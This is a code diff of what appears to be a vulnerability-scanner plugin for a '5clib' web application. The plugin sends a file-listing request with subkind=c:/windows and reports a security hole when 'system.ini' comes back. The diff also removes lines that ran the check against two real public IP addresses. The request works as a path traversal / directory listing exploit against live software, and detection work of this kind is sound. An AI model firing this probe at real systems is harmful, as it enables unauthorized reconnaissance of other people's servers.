@@ -7,7 +7,7 @@
 
 def assign(service,arg):
     if service=="5clib":
-        return True,arg 
+        return True,arg
 
 
 def  audit(arg):
@@ -17,14 +17,15 @@ def  audit(arg):
     code,head,res,errcode,_=curl.curl2(url,post)
     if code==200 and "system.ini" in res:
         security_hole(url)
+        return arg
     #第二处
     url=arg+"5clib/kinweblistaction.action?filePath=&kind=disc&curpage=1&actionName=&subkind=c:/windows&doAction=second&pagesize=20&curPage=1&toPage="
     code,head,res,errcode,_=curl.curl2(url,post)
     if code==200 and "system.ini" in res:
         security_hole(url)
-        
-        
-if __name__=="__main__":
+
+
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('5clib','http://183.64.83.104:8081/')[1])
-    audit(assign('5clib','http://222.208.6.176:8081/')[1])
